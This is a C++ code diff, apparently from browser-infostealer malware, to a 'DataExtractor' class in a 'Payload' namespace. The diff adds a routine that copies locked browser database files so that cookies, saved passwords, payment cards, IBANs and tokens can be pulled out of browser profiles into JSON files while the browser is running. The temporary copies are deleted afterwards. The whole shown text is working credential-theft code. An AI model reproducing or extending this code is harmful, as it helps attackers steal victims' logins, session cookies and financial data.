@@ -2,6 +2,7 @@
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include "data_extractor.hpp"
+#include "handle_duplicator.hpp"
 #include "../crypto/aes_gcm.hpp"
 #include <fstream>
 #include <sstream>
@@ -23,6 +24,55 @@ namespace Payload {
         return db;
     }
 
+    sqlite3* DataExtractor::OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath) {
+        sqlite3* db = OpenDatabase(dbPath);
+        if (db) {
+            sqlite3_stmt* stmt = nullptr;
+            if (sqlite3_prepare_v2(db, "SELECT 1", -1, &stmt, nullptr) == SQLITE_OK) {
+                if (sqlite3_step(stmt) == SQLITE_ROW) {
+                    sqlite3_finalize(stmt);
+                    return db;
+                }
+                sqlite3_finalize(stmt);
+            }
+            sqlite3_close(db);
+            db = nullptr;
+        }
+
+        HandleDuplicator duplicator;
+
+        auto tempDir = m_outputBase / ".temp";
+        auto tempDbPath = duplicator.CopyLockedFile(dbPath, tempDir);
+
+        if (!tempDbPath) {
+            return nullptr;
+        }
+
+        m_tempFiles.push_back(*tempDbPath);
+
+        return OpenDatabase(*tempDbPath);
+    }
+
+    void DataExtractor::CleanupTempFiles() {
+        for (const auto& tempFile : m_tempFiles) {
+            try {
+                if (std::filesystem::exists(tempFile)) {
+                    std::filesystem::remove(tempFile);
+                }
+            } catch (...) {
+                // Ignore cleanup failures
+            }
+        }
+        m_tempFiles.clear();
+
+        try {
+            auto tempDir = m_outputBase / ".temp";
+            if (std::filesystem::exists(tempDir) && std::filesystem::is_empty(tempDir)) {
+                std::filesystem::remove(tempDir);
+            }
+        } catch (...) {}
+    }
+
     void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
         m_pipe.Log("PROFILE:" + profilePath.filename().string());
         
@@ -38,7 +88,7 @@ namespace Payload {
             // Cookies
             auto cookiePath = profilePath / "Network" / "Cookies";
             if (std::filesystem::exists(cookiePath)) {
-                if (auto db = OpenDatabase(cookiePath)) {
+                if (auto db = OpenDatabaseWithHandleDuplication(cookiePath)) {
                     ExtractCookies(db, m_outputBase / browserName / profilePath.filename() / "cookies.json");
                     sqlite3_close(db);
                 }
@@ -49,7 +99,7 @@ namespace Payload {
             // Passwords
             auto loginPath = profilePath / "Login Data";
             if (std::filesystem::exists(loginPath)) {
-                if (auto db = OpenDatabase(loginPath)) {
+                if (auto db = OpenDatabaseWithHandleDuplication(loginPath)) {
                     ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / "passwords.json");
                     sqlite3_close(db);
                 }
@@ -60,7 +110,7 @@ namespace Payload {
             // Cards & IBANs (Web Data)
             auto webDataPath = profilePath / "Web Data";
             if (std::filesystem::exists(webDataPath)) {
-                if (auto db = OpenDatabase(webDataPath)) {
+                if (auto db = OpenDatabaseWithHandleDuplication(webDataPath)) {
                     ExtractCards(db, m_outputBase / browserName / profilePath.filename() / "cards.json");
                     ExtractIBANs(db, m_outputBase / browserName / profilePath.filename() / "iban.json");
                     ExtractTokens(db, m_outputBase / browserName / profilePath.filename() / "tokens.json");
@@ -68,6 +118,8 @@ namespace Payload {
                 }
             }
         } catch(...) {}
+
+        CleanupTempFiles();
     }
 
     void DataExtractor::ExtractCookies(sqlite3* db, const std::filesystem::path& outFile) {
